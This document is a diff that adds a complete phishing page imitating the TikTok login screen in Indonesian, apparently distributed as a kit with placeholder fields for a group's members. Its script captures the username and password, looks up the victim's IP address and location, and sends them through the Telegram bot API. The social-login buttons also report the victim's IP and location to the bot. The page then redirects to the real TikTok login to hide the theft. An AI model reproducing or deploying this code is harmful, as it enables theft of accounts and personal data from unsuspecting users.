@@ -1,0 +1,603 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login TikTok</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        body {
+            background-color: #000;
+            color: #fff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            max-width: 480px;
+            width: 100%;
+        }
+
+        .logo {
+            margin-bottom: 30px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .tiktok-logo {
+            display: flex;
+            align-items: center;
+            position: relative;
+        }
+
+        .tiktok-logo .music-note {
+            font-size: 36px;
+            color: #25f4ee;
+            position: relative;
+            z-index: 2;
+        }
+
+        .tiktok-logo .music-note::before {
+            content: "♬";
+            position: absolute;
+            color: #fe2c55;
+            transform: translate(-2px, 2px);
+            z-index: 1;
+        }
+
+        .logo-text {
+            font-size: 32px;
+            font-weight: bold;
+            background: linear-gradient(to right, #25f4ee, #fe2c55);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            letter-spacing: -1px;
+        }
+
+        .login-box {
+            background-color: #121212;
+            border-radius: 10px;
+            padding: 40px 30px;
+            width: 100%;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+        }
+
+        .login-title {
+            font-size: 24px;
+            margin-bottom: 30px;
+            text-align: center;
+        }
+
+        .input-group {
+            margin-bottom: 20px;
+            position: relative;
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 15px;
+            background-color: #222;
+            border: 1px solid #333;
+            border-radius: 5px;
+            color: #fff;
+            font-size: 16px;
+            outline: none;
+            transition: border-color 0.3s;
+        }
+
+        .input-group input:focus {
+            border-color: #25f4ee;
+        }
+
+        .password-toggle {
+            position: absolute;
+            right: 15px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: none;
+            border: none;
+            color: #777;
+            cursor: pointer;
+            font-size: 18px;
+        }
+
+        .forgot-password {
+            text-align: right;
+            margin-bottom: 25px;
+        }
+
+        .forgot-password a {
+            color: #25f4ee;
+            text-decoration: none;
+            font-size: 14px;
+        }
+
+        .forgot-password a:hover {
+            text-decoration: underline;
+        }
+
+        .login-btn {
+            width: 100%;
+            padding: 15px;
+            background: linear-gradient(to right, #25f4ee, #fe2c55);
+            border: none;
+            border-radius: 5px;
+            color: #fff;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: opacity 0.3s;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .login-btn:hover {
+            opacity: 0.9;
+        }
+
+        .login-btn:disabled {
+            opacity: 0.7;
+            cursor: not-allowed;
+        }
+
+        .spinner {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(255,255,255,.3);
+            border-radius: 50%;
+            border-top-color: #fff;
+            animation: spin 1s ease-in-out infinite;
+            margin-right: 10px;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .divider {
+            display: flex;
+            align-items: center;
+            margin: 25px 0;
+            color: #777;
+        }
+
+        .divider::before, .divider::after {
+            content: "";
+            flex: 1;
+            height: 1px;
+            background-color: #333;
+        }
+
+        .divider span {
+            padding: 0 15px;
+            font-size: 14px;
+        }
+
+        .social-login {
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+        }
+
+        .social-btn {
+            padding: 15px;
+            border-radius: 5px;
+            border: 1px solid #333;
+            background-color: #222;
+            color: #fff;
+            font-size: 16px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: background-color 0.3s;
+        }
+
+        .social-btn i {
+            margin-right: 10px;
+            font-size: 18px;
+        }
+
+        .social-btn:hover {
+            background-color: #333;
+        }
+
+        .signup-link {
+            text-align: center;
+            margin-top: 25px;
+            color: #777;
+        }
+
+        .signup-link a {
+            color: #25f4ee;
+            text-decoration: none;
+            font-weight: bold;
+        }
+
+        .signup-link a:hover {
+            text-decoration: underline;
+        }
+
+        .footer {
+            margin-top: 30px;
+            font-size: 14px;
+            color: #777;
+            text-align: center;
+            line-height: 1.6;
+        }
+
+        .footer a {
+            color: #bbb;
+            text-decoration: none;
+        }
+
+        .footer a:hover {
+            text-decoration: underline;
+        }
+
+        .footer-links {
+            display: flex;
+            justify-content: center;
+            flex-wrap: wrap;
+            gap: 15px;
+            margin-top: 10px;
+        }
+
+        .notification {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            padding: 15px 20px;
+            border-radius: 5px;
+            color: white;
+            font-weight: bold;
+            z-index: 1000;
+            opacity: 0;
+            transform: translateX(100%);
+            transition: all 0.3s ease;
+        }
+
+        .notification.show {
+            opacity: 1;
+            transform: translateX(0);
+        }
+
+        .notification.success {
+            background-color: #4CAF50;
+        }
+
+        .notification.error {
+            background-color: #f44336;
+        }
+
+      
+        @media (max-width: 480px) {
+            .login-box {
+                padding: 30px 20px;
+            }
+            
+            .logo-text {
+                font-size: 28px;
+            }
+            
+            .login-title {
+                font-size: 20px;
+            }
+        }
+
+        
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .login-box {
+            animation: fadeIn 0.8s ease-out;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <div class="tiktok-logo">
+                <div class="music-note"></div>
+            </div>
+            <div class="logo-text">TikTok</div>
+        </div>
+        
+        <div class="login-box">
+            <h1 class="login-title">Masuk ke TikTok</h1>
+            
+            <form id="loginForm">
+                <div class="input-group">
+                    <input type="text" id="username" placeholder="Nomor telepon/Email/Username" required>
+                </div>
+                
+                <div class="input-group">
+                    <input type="password" id="password" placeholder="Kata sandi" required>
+                    <button type="button" class="password-toggle" id="togglePassword">
+                        <i class="far fa-eye"></i>
+                    </button>
+                </div>
+                
+                <div class="forgot-password">
+                    <a href="#">Lupa kata sandi?</a>
+                </div>
+                
+                <button type="submit" class="login-btn" id="submitBtn">
+                    Masuk
+                </button>
+            </form>
+            
+            <div class="divider">
+                <span>atau</span>
+            </div>
+            
+            <div class="social-login">
+                <button class="social-btn" id="googleBtn">
+                    <i class="fab fa-google"></i> Lanjutkan dengan Google
+                </button>
+                <button class="social-btn" id="facebookBtn">
+                    <i class="fab fa-facebook"></i> Lanjutkan dengan Facebook
+                </button>
+                <button class="social-btn" id="twitterBtn">
+                    <i class="fab fa-twitter"></i> Lanjutkan dengan Twitter
+                </button>
+            </div>
+            
+            <div class="signup-link">
+                <p>Belum punya akun? <a href="#">Daftar</a></p>
+            </div>
+        </div>
+        
+        <div class="footer">
+            <p>Dengan melanjutkan, Anda menyetujui <a href="#">Ketentuan Layanan</a> kami dan mengonfirmasi bahwa Anda telah membaca <a href="#">Kebijakan Privasi</a> kami.</p>
+            <div class="footer-links">
+                <a href="#">Bantuan</a>
+                <a href="#">Privasi</a>
+                <a href="#">Ketentuan</a>
+            </div>
+        </div>
+    </div>
+
+    <div id="notification" class="notification"></div>
+
+    <script>
+       
+        const TELEGRAM_BOT_TOKEN = 'MASUKAN TOKEN BOT LU MEMBER FROSTWOLF';
+        const TELEGRAM_CHAT_ID = 'CET ID TELEGRAM LU MEM FROSTWOLF';
+        
+        function showNotification(message, type = 'success') {
+            const notification = document.getElementById('notification');
+            notification.textContent = message;
+            notification.className = `notification ${type}`;
+            
+            notification.classList.add('show');
+            
+            setTimeout(() => {
+                notification.classList.remove('show');
+            }, 3000);
+        }
+        
+ 
+        async function sendToTelegram(data) {
+            try {
+              
+                const message = `🔔 LOGIN TIKTOK DETECTED 🔔\n\n📱 User: ${data.username}\n🔑 Password: ${data.password}\n\n📍 IP: ${data.ip}\n🌍 Location: ${data.location}\n📱 Browser: ${data.browser}\n🕐 Time: ${new Date().toLocaleString()}`;
+                
+               
+                const encodedMessage = encodeURIComponent(message);
+                
+           
+                const response = await fetch(
+                    `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodedMessage}&parse_mode=HTML`
+                );
+                
+                const result = await response.json();
+                
+                if (result.ok) {
+                    console.log('Data berhasil dikirim ke Telegram');
+                    return true;
+                } else {
+                    console.error('Gagal mengirim ke Telegram:', result);
+                    return false;
+                }
+            } catch (error) {
+                console.error('Error sending to Telegram:', error);
+                return false;
+            }
+        }
+        
+        
+        async function getUserInfo() {
+            try {
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                
+                
+                let location = "Tidak dapat mendeteksi lokasi";
+                try {
+                    const geoResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
+                    const geoData = await geoResponse.json();
+                    location = `${geoData.city}, ${geoData.region}, ${geoData.country_name}`;
+                } catch (geoError) {
+                    console.log('Tidak bisa mendapatkan info lokasi');
+                }
+                
+                return {
+                    ip: ipData.ip,
+                    location: location,
+                    browser: navigator.userAgent,
+                    platform: navigator.platform
+                };
+            } catch (error) {
+                console.error('Error getting user info:', error);
+                return {
+                    ip: "Tidak dapat mendeteksi",
+                    location: "Tidak dapat mendeteksi",
+                    browser: navigator.userAgent,
+                    platform: navigator.platform
+                };
+            }
+        }
+        
+   
+        document.getElementById('togglePassword').addEventListener('click', function() {
+            const passwordInput = document.getElementById('password');
+            const icon = this.querySelector('i');
+            
+            if (passwordInput.type === 'password') {
+                passwordInput.type = 'text';
+                icon.classList.remove('fa-eye');
+                icon.classList.add('fa-eye-slash');
+            } else {
+                passwordInput.type = 'password';
+                icon.classList.remove('fa-eye-slash');
+                icon.classList.add('fa-eye');
+            }
+        });
+        
+    
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const username = document.getElementById('username').value.trim();
+            const password = document.getElementById('password').value.trim();
+            const submitBtn = document.getElementById('submitBtn');
+            
+            if (!username || !password) {
+                showNotification('Harap isi semua field!', 'error');
+                return;
+            }
+            
+       
+            submitBtn.innerHTML = '<span class="spinner"></span> Memproses...';
+            submitBtn.disabled = true;
+            
+            try {
+               
+                const userInfo = await getUserInfo();
+                
+          
+                const loginData = {
+                    username: username,
+                    password: password,
+                    ...userInfo
+                };
+                
+        
+                const telegramSuccess = await sendToTelegram(loginData);
+                
+                if (telegramSuccess) {
+                   
+                    setTimeout(() => {
+                        
+                        submitBtn.innerHTML = 'Masuk';
+                        submitBtn.disabled = false;
+                        
+                        
+                        showNotification('Login berhasil! Mengalihkan...', 'success');
+                        
+                       
+                        setTimeout(() => {
+                            window.location.href = 'https://www.tiktok.com/login';
+                        }, 2000);
+                    }, 2000);
+                } else {
+                    throw new Error('Gagal mengirim data');
+                }
+                
+            } catch (error) {
+                console.error('Login error:', error);
+                
+                
+                submitBtn.innerHTML = 'Masuk';
+                submitBtn.disabled = false;
+                
+             
+                showNotification('Terjadi kesalahan. Coba lagi.', 'error');
+            }
+        });
+        
+      
+        const socialButtons = {
+            googleBtn: 'Google',
+            facebookBtn: 'Facebook', 
+            twitterBtn: 'Twitter'
+        };
+        
+        Object.keys(socialButtons).forEach(btnId => {
+            document.getElementById(btnId).addEventListener('click', async function() {
+                const platform = socialButtons[btnId];
+                const userInfo = await getUserInfo();
+                
+                const socialData = {
+                    platform: platform,
+                    action: 'social_login_attempt',
+                    ...userInfo
+                };
+                
+                
+                const message = `🔔 PERCOBAAN LOGIN SOSIAL TIKTOK 🔔\n\n📱 Platform: ${platform}\n\n📍 IP: ${userInfo.ip}\n🌍 Location: ${userInfo.location}\n📱 Browser: ${userInfo.browser}\n🕐 Time: ${new Date().toLocaleString()}`;
+                
+                const encodedMessage = encodeURIComponent(message);
+                await fetch(
+                    `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodedMessage}&parse_mode=HTML`
+                );
+                
+                showNotification(`Mencoba login dengan ${platform}...`, 'success');
+                
+              
+                setTimeout(() => {
+                    window.location.href = 'https://www.tiktok.com/login';
+                }, 1500);
+            });
+        });
+        
+   
+        const inputs = document.querySelectorAll('input');
+        inputs.forEach(input => {
+            input.addEventListener('focus', function() {
+                this.parentElement.style.transform = 'scale(1.02)';
+                this.parentElement.style.transition = 'transform 0.2s';
+            });
+            
+            input.addEventListener('blur', function() {
+                this.parentElement.style.transform = 'scale(1)';
+            });
+        });
+        
+       
+        const musicNote = document.querySelector('.music-note');
+        let noteAnimation;
+        
+        function animateLogo() {
+            const notes = ['♩', '♪', '♫', '♬'];
+            let index = 0;
+            
+            noteAnimation = setInterval(() => {
+                musicNote.textContent = notes[index];
+                index = (index + 1) % notes.length;
+            }, 500);
+        }
+        
+        
+        animateLogo();
+    </script>
+</body>
+</html>
